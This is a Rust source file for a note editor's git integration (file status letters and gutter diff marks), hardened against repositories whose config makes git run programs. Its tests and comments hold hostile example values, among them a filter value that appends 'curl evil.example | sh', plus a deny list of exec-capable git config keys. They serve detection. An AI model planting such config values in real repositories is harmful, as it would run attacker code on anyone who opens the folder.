//! The letters next to file names in the tree, and the bars next to the lines,
//! when the folder happens to be a git repository.
//!
//! This is a nicety and behaves like one: it shells out to whatever `git` is on
//! the PATH, and every way that can go wrong — no git installed, not a
//! repository, a git that answers in a format we do not recognise — comes back
//! as `None` rather than as an error. An editor that refuses to show a file
//! tree because git is missing would be a worse editor.
//!
//! What this module deliberately does not do: anything that writes. No staging,
//! no committing, no fetching. UwUNotes reads git's opinion and colours a few
//! rows with it.

use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{LazyLock, Mutex, OnceLock};
use std::time::{Duration, Instant};

use serde::Serialize;

/// Windows creates a console for a child process unless told not to, and a
/// status poll every few seconds would flash a black box over the editor.
#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

/// One answer per folder to "can this repository be asked anything safely?",
/// for a few seconds. The gutter asks per open file, so a burst of files opened
/// at once costs one `git config` and not twenty.
///
/// Only for a few seconds: until 0.3.1 an answer was kept for the whole run,
/// and a `.git/config` that changed afterwards — a synced folder catching up,
/// an archive unpacked over the project — was polled on the old verdict every
/// eight seconds from then on. Now the next poll after the expiry asks again.
static REPOSITORY_IS_INERT: LazyLock<Mutex<HashMap<PathBuf, (bool, Instant)>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// How long a verdict holds. Shorter than the status poll, so every poll that
/// runs git has had its repository looked at within the same breath.
const TRUST_CACHE_TTL: Duration = Duration::from_secs(5);

/// A folder per open document, and every one of them opened by hand. Still: a
/// cache with no ceiling is a leak.
const TRUST_CACHE_LIMIT: usize = 512;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
enum GitFileStatus {
    Added,
    Modified,
    Deleted,
    Untracked,
    Conflicted,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub(crate) struct GitStatuses {
    /// The repository root, which is not always the folder the user opened.
    root: String,
    /// `None` on a detached HEAD, where there is no branch name to show.
    branch: Option<String>,
    /// Absolute path to status, for the files git has something to say about.
    /// A `BTreeMap` so two polls of an unchanged tree produce the same object
    /// and the page's diffing has nothing to do.
    files: BTreeMap<String, GitFileStatus>,
}

/// Git's opinion of `root`, or `null` when there is none to be had.
#[tauri::command]
pub(crate) async fn git_statuses(root: String) -> Option<GitStatuses> {
    tauri::async_runtime::spawn_blocking(move || statuses(Path::new(&root)))
        .await
        .ok()
        .flatten()
}

fn statuses(folder: &Path) -> Option<GitStatuses> {
    if !repository_is_inert(folder) {
        return None;
    }

    let repository = PathBuf::from(text(&git(folder, &["rev-parse", "--show-toplevel"])?)?);
    if repository.as_os_str().is_empty() {
        return None;
    }

    let branch = git(folder, &["rev-parse", "--abbrev-ref", "HEAD"])
        .and_then(|output| text(&output))
        // A detached HEAD literally answers "HEAD", which is not a branch name
        // and would read as one in the status bar.
        .filter(|branch| !branch.is_empty() && branch.as_str() != "HEAD");

    // `-z` because it is the only format in which a file name containing a
    // quote, a newline or a non-UTF-8 byte survives intact.
    //
    // `--ignore-submodules=all` because a submodule's own configuration lives
    // in `.git/modules/<name>/config`, which the check above never reads, and a
    // status of the parent runs a status inside every submodule — clean
    // filters and all. A submodule shows up as the one entry for its folder
    // either way; what it contains is its own repository's business.
    let porcelain = git(
        folder,
        &["status", "--porcelain", "-z", "--ignore-submodules=all"],
    )?;

    Some(GitStatuses {
        root: display_path(&repository),
        branch,
        files: parse_porcelain(&repository, &porcelain),
    })
}

/// Runs one git command in `folder`. `None` for a git that is not installed, a
/// folder that is not a repository, or any other non-zero exit.
///
/// The two options in front of the subcommand are not tidiness. A repository is
/// data — `.git/config` is not signed, and it travels inside a zip, a network
/// share or a synced folder — and several configuration values are things git
/// runs as a program. `core.fsmonitor` is a command line executed on `status`;
/// `core.hooksPath` can point at a `post-index-change` hook that fires when a
/// status refreshes the index, which `--no-optional-locks` stops by never
/// writing one. So a folder the user merely opened would otherwise run a
/// program as them, every eight seconds, with the console hidden. What no flag
/// can switch off is checked in [`repository_is_inert`] instead.
fn git(folder: &Path, arguments: &[&str]) -> Option<Vec<u8>> {
    let mut command = Command::new(git_program()?);
    command
        // `-C` rather than `current_dir`, so a folder that has been deleted
        // fails as a git error instead of as a spawn error.
        .arg("-C")
        .arg(folder)
        .arg("--no-optional-locks")
        .arg("-c")
        .arg("core.fsmonitor=false")
        // The same reason as `--ignore-submodules` on status, for every other
        // command: never descend into a repository nobody has checked.
        .arg("-c")
        .arg("diff.ignoreSubmodules=all")
        .args(arguments)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    hide_console(&mut command);

    let output = command.output().ok()?;
    output.status.success().then_some(output.stdout)
}

/// The `git` we will run, as an absolute path, worked out once.
///
/// `Command::new("git")` would leave the name for Rust to resolve, and on
/// Windows that search starts in the directory of the running executable —
/// which for a per-user install is a folder anything running as the user can
/// write to. It is the same folder `build.rs` and `system.rs` already refuse to
/// load DLLs from, with the same reasoning. So PATH is walked here, with that
/// one directory left out.
fn git_program() -> Option<&'static Path> {
    static GIT: OnceLock<Option<PathBuf>> = OnceLock::new();
    GIT.get_or_init(resolve_git).as_deref()
}

fn resolve_git() -> Option<PathBuf> {
    let name = if cfg!(windows) { "git.exe" } else { "git" };
    let own_folder = std::env::current_exe()
        .ok()
        .and_then(|exe| exe.parent().map(Path::to_path_buf))
        .and_then(|folder| folder.canonicalize().ok());

    // `split_paths` rather than splitting on `;` by hand: it is what handles a
    // quoted entry. `canonicalize` on both sides is what makes the skip survive
    // a different spelling or a trailing slash.
    std::env::split_paths(&std::env::var_os("PATH")?)
        .filter(|folder| !folder.as_os_str().is_empty())
        .filter(|folder| match (folder.canonicalize().ok(), &own_folder) {
            (Some(folder), Some(own)) => folder != *own,
            _ => true,
        })
        .map(|folder| folder.join(name))
        .find(|candidate| candidate.is_file())
}

/// Whether this repository can be asked for a status or a diff without running
/// programs it names itself.
///
/// `git()` turns off the two that a flag can reach. A *clean filter* —
/// `filter.<name>.clean` plus a `.gitattributes` that points at it — is the one
/// it cannot: git has no `--no-filters` for diff, and it runs the filter to
/// normalise the working copy before comparing. So a repository that names any
/// exec-capable key in its own `.git/config` gets no letters in the tree and no
/// marks in the gutter at all.
///
/// Normal repositories name none of these locally, with one exception that is
/// entirely ordinary: `git lfs install --local` writes three filter keys into
/// the config of every repository somebody uses LFS in. Those are read by value
/// and let through when the value is git-lfs's own — see [`runs_a_program`].
/// `git config` prints keys and values and executes neither, so asking, and
/// reading the answers, is itself safe.
fn repository_is_inert(folder: &Path) -> bool {
    let key = folder.to_path_buf();
    if let Some((known, at)) = REPOSITORY_IS_INERT
        .lock()
        .ok()
        .and_then(|cache| cache.get(&key).copied())
    {
        if at.elapsed() < TRUST_CACHE_TTL {
            return known;
        }
    }

    // No answer is not an answer: the folder is not a repository yet, or git is
    // not installed. Saying no costs nothing, because the caller's own command
    // was going to fail too — and not remembering it means a `git init` in a
    // folder that is already open is noticed at the next poll rather than at
    // the next start.
    let Some(answer) = inspect_repository(folder) else {
        return false;
    };
    if !answer {
        tracing::warn!(
            folder = %folder.display(),
            "git decoration is off for this folder: its .git/config names a program for git to run"
        );
    }
    if let Ok(mut cache) = REPOSITORY_IS_INERT.lock() {
        if cache.len() >= TRUST_CACHE_LIMIT {
            cache.retain(|_, (_, at)| at.elapsed() < TRUST_CACHE_TTL);
        }
        if cache.len() < TRUST_CACHE_LIMIT {
            cache.insert(key, (answer, Instant::now()));
        }
    }
    answer
}

fn inspect_repository(folder: &Path) -> Option<bool> {
    // Values as well as names. Printing a value is not running it: `git
    // config` reads the file and writes what it found on stdout, whatever the
    // key would have meant to a command that acted on it.
    //
    // Everything git would load, not `--local` alone. `--local` is
    // `.git/config` and nothing else: it neither follows an `include.path`
    // nor lists `.git/config.worktree`, and both are read by the `status` and
    // `diff` this check stands in front of — a filter hidden in an included
    // file ran while this check reported the repository clean. `--includes`
    // follows the includes, and `--show-scope` says which file every entry
    // came from, so the user's own global and system settings, which are not
    // the repository's to set, can be told apart and left alone.
    let listing = git(
        folder,
        &["config", "--list", "--includes", "--show-scope", "--null"],
    )?;
    Some(!lists_a_program(&String::from_utf8_lossy(&listing)))
}

/// Whether any repository-scoped entry of a `git config --list --show-scope
/// --null` listing is a program.
///
/// `--null`, and not one entry per line, because a value may contain a newline:
/// read line by line, the rest of such a value reads as an entry of its own,
/// which would let a repository write its own alibi underneath a key that is
/// not innocent at all. With `--null` a record is the scope, a NUL, then the
/// entry and another NUL — which no value can contain — and an entry's key is
/// what precedes the first newline inside it.
///
/// Only `local` and `worktree` are the repository's; an included file counts
/// as the scope that included it. An `include` or `includeIf` key in the
/// repository's own config is refused by itself: the file it points at is read
/// on every git command and can change after this check has looked at it.
fn lists_a_program(listing: &str) -> bool {
    let mut fields = listing.split('\0');
    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
        if !matches!(scope, "local" | "worktree") || entry.is_empty() {
            continue;
        }
        let (key, value) = match entry.split_once('\n') {
            Some((key, value)) => (key, Some(value)),
            // A key written on its own with no `=`, which git reads as a
            // boolean. Not a command line, but not what git-lfs writes either,
            // so it is judged by its name alone.
            None => (entry, None),
        };
        let lower = key.trim().to_ascii_lowercase();
        if lower.starts_with("include.") || lower.starts_with("includeif.") {
            return true;
        }
        if runs_a_program(key, value) {
            return true;
        }
    }
    false
}

/// Whether this entry is one git would execute, key and value together.
///
/// The name still decides, save for the one false positive that has a shape:
/// the three keys `git lfs install --local` writes are exec-capable by
/// definition, and git-lfs sets them to fixed strings of its own. An entry
/// holding exactly one of those is a repository that uses LFS rather than a
/// repository carrying something, and it keeps its decoration.
fn runs_a_program(key: &str, value: Option<&str>) -> bool {
    names_a_program(key) && !is_stock_lfs_filter(key, value)
}

/// The values `git lfs install --local` writes, and nothing else.
///
/// Compared whole, after trimming, rather than by prefix or by substring:
/// `git-lfs clean -- %f; curl evil.example | sh` begins with a canonical value
/// and is not one. `clean` has no `--skip` form — `git lfs install
/// --skip-smudge` changes the other two and leaves it as it is.
fn is_stock_lfs_filter(key: &str, value: Option<&str>) -> bool {
    let Some(value) = value.map(str::trim) else {
        return false;
    };
    match key.trim().to_ascii_lowercase().as_str() {
        "filter.lfs.clean" => value == "git-lfs clean -- %f",
        "filter.lfs.smudge" => {
            matches!(
                value,
                "git-lfs smudge -- %f" | "git-lfs smudge --skip -- %f"
            )
        }
        "filter.lfs.process" => {
            matches!(
                value,
                "git-lfs filter-process" | "git-lfs filter-process --skip"
            )
        }
        _ => false,
    }
}

/// Whether a configuration key holds something git will execute.
///
/// Keys arrive from `--list` lowercased apart from a subsection's own name, so
/// the fixed names compare directly and the rest are matched by shape:
/// `diff.<driver>.command`, `<anything>.textconv`, and the three halves of a
/// filter driver.
fn names_a_program(key: &str) -> bool {
    const NAMED: &[&str] = &[
        "core.fsmonitor",
        "core.hookspath",
        "core.pager",
        "core.editor",
        "core.sshcommand",
        "core.alternaterefscommand",
        "diff.external",
    ];

    let lower = key.trim().to_ascii_lowercase();
    if NAMED.contains(&lower.as_str()) {
        return true;
    }
    if lower.ends_with(".textconv") || lower.ends_with(".command") {
        return true;
    }
    lower.starts_with("filter.")
        && (lower.ends_with(".clean") || lower.ends_with(".smudge") || lower.ends_with(".process"))
}

/// One line of git output as a trimmed `String`, or `None` when it was not text.
fn text(output: &[u8]) -> Option<String> {
    std::str::from_utf8(output)
        .ok()
        .map(|line| line.trim().to_owned())
}

/// Splits `git status --porcelain -z` into paths and statuses.
///
/// Every record is `XY <path>` terminated by a NUL, and a rename or copy adds a
/// second NUL-terminated field for where the file came from. Git's own
/// documentation is the authority on the order: with `-z` the current path
/// comes first and the original second, which is the reverse of the readable
/// format's `old -> new`.
fn parse_porcelain(repository: &Path, output: &[u8]) -> BTreeMap<String, GitFileStatus> {
    let mut files = BTreeMap::new();
    let mut records = output
        .split(|byte| *byte == 0)
        .filter(|field| !field.is_empty());

    while let Some(record) = records.next() {
        // Two status letters, a space, and at least one character of path.
        let [index, worktree, b' ', path @ ..] = record else {
            continue;
        };
        if path.is_empty() {
            continue;
        }

        if is_move(*index) || is_move(*worktree) {
            // Where the file came from. Git wants us to know; the tree does not.
            records.next();
        }

        // Porcelain paths are relative to the repository root and always use
        // forward slashes; the page compares them against paths from
        // `list_dir`, so they have to come out in the platform's own spelling.
        let relative = String::from_utf8_lossy(path).into_owned();
        files.insert(
            display_path(&repository.join(relative)),
            classify(*index, *worktree),
        );
    }

    files
}

const fn is_move(code: u8) -> bool {
    matches!(code, b'R' | b'C')
}

/// Two status letters into the one word the tree shows. The order of the arms
/// is the order of the user's interest: a conflict matters more than the fact
/// that the file is also modified.
const fn classify(index: u8, worktree: u8) -> GitFileStatus {
    match (index, worktree) {
        (b'?', _) | (_, b'?') => GitFileStatus::Untracked,
        (b'U', _) | (_, b'U') | (b'A', b'A') | (b'D', b'D') => GitFileStatus::Conflicted,
        (b'A', _) => GitFileStatus::Added,
        (b'D', _) | (_, b'D') => GitFileStatus::Deleted,
        _ => GitFileStatus::Modified,
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
enum GitHunkKind {
    Added,
    Modified,
    Deleted,
}

/// One run of changed lines, numbered in the file as it is on disk now.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub(crate) struct GitHunk {
    kind: GitHunkKind,
    /// 1-based. For `Deleted` it is the line the removal sits *after*, which is
    /// 0 when the removed lines were at the very top of the file.
    from_line: u32,
    /// Always 1 for `Deleted`: nothing on that line is gone, the gap below it is.
    line_count: u32,
}

/// What `git diff` has to say about one file, line by line.
///
/// `None` covers no git, no repository, an untracked file and a file with no
/// changes alike, because the gutter draws exactly the same nothing for all
/// four and the page has no decision to make between them.
#[tauri::command]
pub(crate) async fn git_file_diff(path: String) -> Option<Vec<GitHunk>> {
    tauri::async_runtime::spawn_blocking(move || file_diff(Path::new(&path)))
        .await
        .ok()
        .flatten()
}

fn file_diff(file: &Path) -> Option<Vec<GitHunk>> {
    let folder = file.parent()?;
    // Not only for a folder the user opened: this runs for every open document,
    // using the file's own parent, so a single file opened out of an extracted
    // archive reaches a `.git/config` that came with it.
    if !repository_is_inert(folder) {
        return None;
    }

    // A path that is not UTF-8 cannot be handed to `git` as an argument here,
    // and a file we cannot name is a file we have no diff for.
    //
    // `--no-ext-diff` and `--no-textconv` are the two ways a repository asks
    // git to run a program of its choosing while producing this diff. The first
    // also neutralises an inherited `GIT_EXTERNAL_DIFF`.
    let diff = git(
        folder,
        &[
            "diff",
            "--no-color",
            "--no-ext-diff",
            "--no-textconv",
            "-U0",
            "--",
            file.to_str()?,
        ],
    )?;
    let hunks = parse_hunks(&String::from_utf8_lossy(&diff));
    (!hunks.is_empty()).then_some(hunks)
}

/// Reads the `@@ -a,b +c,d @@` headers and nothing else.
///
/// `-U0` means every header is followed by exactly the changed lines, so the
/// headers alone say which lines changed and how — which is the whole of what a
/// gutter mark needs, and it leaves the diffing to git rather than to us.
///
/// A file in a merge conflict makes git print a combined diff, whose headers
/// are `@@@` with three ranges. Those fail the prefix check and the file ends up
/// with no marks at all, which is about the right amount of opinion to have
/// about a file that is mid-merge.
fn parse_hunks(diff: &str) -> Vec<GitHunk> {
    diff.lines().filter_map(parse_hunk_header).collect()
}

fn parse_hunk_header(line: &str) -> Option<GitHunk> {
    let mut ranges = line.strip_prefix("@@ ")?.split(' ');
    let (_, removed) = line_range(ranges.next()?.strip_prefix('-')?)?;
    let (start, added) = line_range(ranges.next()?.strip_prefix('+')?)?;

    let (kind, line_count) = match (removed, added) {
        // Neither side has a line in it. Not something git emits, but a header
        // we cannot draw anything for either way.
        (0, 0) => return None,
        (0, _) => (GitHunkKind::Added, added),
        (_, 0) => (GitHunkKind::Deleted, 1),
        _ => (GitHunkKind::Modified, added),
    };

    Some(GitHunk {
        kind,
        from_line: start,
        line_count,
    })
}

/// `12,3`, or a bare `12` where the count of 1 is left out.
fn line_range(text: &str) -> Option<(u32, u32)> {
    match text.split_once(',') {
        Some((start, count)) => Some((start.parse().ok()?, count.parse().ok()?)),
        None => Some((text.parse().ok()?, 1)),
    }
}

/// Absolute, and with the separators this platform uses. Deliberately not
/// `canonicalize`: that resolves symlinks and, on Windows, hands back the
/// `\\?\` form nobody wants to read.
fn display_path(path: &Path) -> String {
    std::path::absolute(path)
        .unwrap_or_else(|_| path.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

#[cfg(windows)]
fn hide_console(command: &mut Command) {
    use std::os::windows::process::CommandExt as _;
    command.creation_flags(CREATE_NO_WINDOW);
}

#[cfg(not(windows))]
fn hide_console(_command: &mut Command) {}

#[cfg(test)]
mod tests {
    use super::{
        classify, git_program, lists_a_program, names_a_program, parse_hunks, parse_porcelain,
        runs_a_program, GitFileStatus, GitHunkKind,
    };
    use std::path::Path;

    #[test]
    fn the_config_keys_git_would_run_are_recognised() {
        // Every one of these is a value git executes: the first three on a
        // plain `git status`, the rest while producing a diff.
        for key in [
            "core.fsmonitor",
            "core.hooksPath",
            "core.pager",
            "diff.external",
            "diff.uwu.command",
            "diff.uwu.textconv",
            "filter.lfs.clean",
            "filter.evil.process",
        ] {
            assert!(names_a_program(key), "{key}");
        }
    }

    #[test]
    fn an_ordinary_repositorys_config_is_left_alone() {
        // What `git init` and a normal day actually write. Refusing these would
        // mean no repository ever got a status letter.
        for key in [
            "core.repositoryformatversion",
            "core.filemode",
            "core.bare",
            "core.logallrefupdates",
            "core.ignorecase",
            "remote.origin.url",
            "remote.origin.fetch",
            "branch.main.remote",
            "user.email",
            "diff.uwu.binary",
        ] {
            assert!(!names_a_program(key), "{key}");
        }
    }

    #[test]
    fn a_repository_that_merely_uses_lfs_keeps_its_decoration() {
        // Everything `git lfs install --local` writes, before and after
        // `--skip-smudge`. All three keys are ones git executes; these three
        // values are the program that does the executing.
        for (key, value) in [
            ("filter.lfs.clean", "git-lfs clean -- %f"),
            ("filter.lfs.smudge", "git-lfs smudge -- %f"),
            ("filter.lfs.smudge", "git-lfs smudge --skip -- %f"),
            ("filter.lfs.process", "git-lfs filter-process"),
            ("filter.lfs.process", "git-lfs filter-process --skip"),
        ] {
            assert!(names_a_program(key), "{key}");
            assert!(!runs_a_program(key, Some(value)), "{key} = {value}");
        }
    }

    #[test]
    fn an_lfs_key_holding_anything_else_is_still_refused() {
        for (key, value) in [
            // A canonical value is not a prefix to build on, at either end.
            (
                "filter.lfs.clean",
                "git-lfs clean -- %f; curl evil.example | sh",
            ),
            ("filter.lfs.clean", "evil && git-lfs clean -- %f"),
            ("filter.lfs.process", "git-lfs filter-process --skip evil"),
            // A real git-lfs value, under the wrong one of its own keys.
            ("filter.lfs.clean", "git-lfs smudge -- %f"),
            // The value is the whole of what we are going on, so nothing at
            // all is nothing to go on.
            ("filter.lfs.clean", ""),
        ] {
            assert!(runs_a_program(key, Some(value)), "{key} = {value}");
        }
        assert!(runs_a_program("filter.lfs.clean", None));
    }

    #[test]
    fn the_exception_is_for_the_lfs_filter_and_nothing_else() {
        // git-lfs's values are not a password: they say which program runs,
        // and under these keys it would run at some other moment, on something
        // else, or not be git-lfs's business at all.
        for (key, value) in [
            ("filter.evil.clean", "git-lfs clean -- %f"),
            ("filter.evil.process", "git-lfs filter-process"),
            ("core.fsmonitor", "git-lfs clean -- %f"),
            ("core.pager", "git-lfs filter-process"),
            ("diff.uwu.textconv", "git-lfs clean -- %f"),
        ] {
            assert!(runs_a_program(key, Some(value)), "{key} = {value}");
        }
    }

    #[test]
    fn a_newline_inside_a_value_cannot_forge_an_entry() {
        // Line by line, this is `filter.lfs.clean` set to exactly what git-lfs
        // writes, followed by an unrelated line. As entries, it is one key
        // holding a value git-lfs did not write.
        let tampered =
            "local\0filter.lfs.clean\ngit-lfs clean -- %f\nevil\0local\0user.name\nuwu\0";
        assert!(lists_a_program(tampered));

        // And the same boundary the other way round: a newline in a value
        // nobody executes does not invent a key that would be.
        let innocent =
            "local\0user.name\nuwu\nfilter.evil.clean\nevil\0local\0core.filemode\nfalse\0";
        assert!(!lists_a_program(innocent));
    }

    #[test]
    fn a_listing_from_a_repository_with_lfs_in_it_reads_as_inert() {
        // What `git config --local --list --null` prints after `git init` and
        // `git lfs install --local`, down to the key that has no value.
        let listing = "local\0core.repositoryformatversion\n0\0local\0core.filemode\nfalse\0\
             local\0filter.lfs.clean\ngit-lfs clean -- %f\0local\0filter.lfs.smudge\ngit-lfs smudge -- %f\0\
             local\0filter.lfs.process\ngit-lfs filter-process\0local\0filter.lfs.required\ntrue\0\
             local\0emptyval.flag\0";
        assert!(!lists_a_program(listing));
    }

    #[test]
    fn an_include_or_a_worktree_config_is_the_repository_speaking() {
        // What an included file contributes is labelled with the scope that
        // included it, and `config.worktree` is its own scope: both count.
        assert!(lists_a_program("local\0include.path\nevil.cfg\0"));
        assert!(lists_a_program("local\0includeif.gitdir:~/.path\nx.cfg\0"));
        assert!(lists_a_program("worktree\0filter.x.clean\nsh -c evil\0"));
        assert!(lists_a_program(
            "local\0core.bare\nfalse\0local\0filter.x.clean\nsh -c evil\0"
        ));
    }

    /// The exploit the 0.4.0 review found, against a real git: a clean-looking
    /// `.git/config` that includes a file carrying a filter. Skipped where git
    /// is not installed.
    #[test]
    fn a_filter_hidden_in_an_included_file_is_found() {
        if git_program().is_none() {
            return;
        }
        let folder =
            std::env::temp_dir().join(format!("uwunotes-git-include-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&folder);
        std::fs::create_dir_all(&folder).unwrap();
        assert!(super::git(&folder, &["init", "-q"]).is_some());
        assert_eq!(super::inspect_repository(&folder), Some(true));

        std::fs::write(
            folder.join(".git").join("evil.cfg"),
            "[filter \"x\"]\n\tclean = echo nope\n",
        )
        .unwrap();
        assert!(super::git(&folder, &["config", "--local", "include.path", "evil.cfg"]).is_some());
        assert_eq!(super::inspect_repository(&folder), Some(false));

        let _ = std::fs::remove_dir_all(&folder);
    }

    #[test]
    fn the_users_own_settings_are_not_held_against_a_repository() {
        // A global pager or a system-wide diff tool is the user's choice, not
        // something a downloaded folder slipped in.
        let listing = "global\0core.pager\nless -R\0system\0diff.external\nmydiff\0\
             command\0core.fsmonitor\nfalse\0local\0core.filemode\nfalse\0";
        assert!(!lists_a_program(listing));
    }

    #[test]
    fn git_is_never_taken_from_the_folder_the_app_runs_from() {
        // Rust's own name resolution searches there first, and a per-user
        // install puts the app somewhere anything running as the user can
        // write. Either we found a git elsewhere on PATH, or we found none.
        let Some(found) = git_program() else { return };
        let own = std::env::current_exe()
            .ok()
            .and_then(|exe| exe.parent().map(Path::to_path_buf))
            .and_then(|folder| folder.canonicalize().ok());
        let Some(own) = own else { return };
        let beside = found.parent().and_then(|folder| folder.canonicalize().ok());
        assert_ne!(beside.as_ref(), Some(&own), "{found:?}");
    }

    #[test]
    fn a_rename_does_not_leave_its_old_path_in_the_tree() {
        let output = b"R  src/new.rs\0src/old.rs\0 M src/other.rs\0";
        let files = parse_porcelain(Path::new("/repo"), output);

        assert_eq!(files.len(), 2);
        let mentions_the_old_name = files.keys().any(|path| path.contains("old.rs"));
        assert!(!mentions_the_old_name, "{files:?}");
    }

    #[test]
    fn the_codes_that_matter_most_win() {
        assert_eq!(classify(b'?', b'?'), GitFileStatus::Untracked);
        assert_eq!(classify(b'D', b'D'), GitFileStatus::Conflicted);
        assert_eq!(classify(b'A', b'U'), GitFileStatus::Conflicted);
        assert_eq!(classify(b'A', b' '), GitFileStatus::Added);
        assert_eq!(classify(b' ', b'D'), GitFileStatus::Deleted);
        assert_eq!(classify(b'M', b' '), GitFileStatus::Modified);
    }

    #[test]
    fn an_empty_side_of_the_header_decides_the_kind() {
        let diff = "\
diff --git a/src/main.rs b/src/main.rs
@@ -1,0 +2,3 @@
@@ -9,2 +11,0 @@
@@ -20,2 +20,2 @@ fn main() {
";
        let hunks = parse_hunks(diff);

        assert_eq!(hunks.len(), 3, "{hunks:?}");
        assert_eq!(hunks[0].kind, GitHunkKind::Added);
        assert_eq!((hunks[0].from_line, hunks[0].line_count), (2, 3));
        assert_eq!(hunks[1].kind, GitHunkKind::Deleted);
        // The deletion sits after line 11 and takes no line of its own with it.
        assert_eq!((hunks[1].from_line, hunks[1].line_count), (11, 1));
        assert_eq!(hunks[2].kind, GitHunkKind::Modified);
        assert_eq!((hunks[2].from_line, hunks[2].line_count), (20, 2));
    }

    #[test]
    fn a_missing_count_means_one_line() {
        let hunks = parse_hunks("@@ -3 +3 @@\n");

        assert_eq!(hunks.len(), 1);
        assert_eq!(hunks[0].kind, GitHunkKind::Modified);
        assert_eq!((hunks[0].from_line, hunks[0].line_count), (3, 1));
    }

    #[test]
    fn a_combined_diff_produces_no_marks() {
        // What a file in a merge conflict looks like. Three ranges, and no
        // honest way to say which side a line came from.
        assert!(parse_hunks("@@@ -1,2 -1,2 +1,3 @@@\n").is_empty());
    }
}
